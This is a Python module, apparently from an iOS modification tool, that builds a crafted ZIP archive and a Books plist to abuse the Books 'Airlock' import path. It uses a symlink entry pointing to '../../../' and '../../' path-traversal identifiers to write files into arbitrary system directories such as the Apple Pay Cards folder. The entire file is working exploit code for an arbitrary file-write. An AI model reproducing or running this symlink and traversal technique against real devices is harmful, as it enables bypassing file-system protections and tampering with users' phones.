from __future__ import annotations

import io
import plistlib
import posixpath
import stat
import struct
import zipfile

from .errors import OperationError

ZIP_EXTRA_ID = 0x5A53
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
CARD_ROOT = "/var/mobile/Library/Passes/Cards"
HELPER_PAYLOAD_SLOTS = 16


def _zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", ZIP_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_airlock_archive(target_directory: str) -> bytes:
    if not target_directory.startswith("/") or target_directory == "/":
        raise OperationError("Airlift target must be an absolute directory below root")
    components = target_directory[1:].split("/")
    if any(component in {"", ".", ".."} for component in components):
        raise OperationError("Airlift target contains an unsafe path component")
    target_tail = target_directory[1:]
    metadata = plistlib.dumps(
        {"Version": 2},
        fmt=plistlib.FMT_BINARY,
        sort_keys=True,
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(_zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            _zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(_zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            _zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in components:
            cursor = posixpath.join(cursor, component) + "/"
            archive.writestr(_zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(_zip_info("payload", stat.S_IFREG | 0o600), b"")
    return output.getvalue()


def build_books_plist(identifiers: list[str]) -> bytes:
    rows = [
        {
            "Persistent ID": identifier,
            "Item ID": str(index),
            "DSID": "1",
        }
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def helper_payload_identifiers(source: str) -> tuple[str, ...]:
    return tuple(f"../../{source}/payload-{index}" for index in range(HELPER_PAYLOAD_SLOTS))


def helper_discard_path(source: str, index: int) -> str:
    return f"airlift-discard-{source}-{index}"


def target_identifier(source_path: str) -> str:
    if (
        not source_path.startswith(f"{CARD_ROOT}/")
        or posixpath.normpath(source_path) != source_path
    ):
        raise OperationError("Card Background path is outside the Apple Pay Cards root")
    identifier = posixpath.relpath(source_path, AIRLOCK_ROOT)
    return identifier
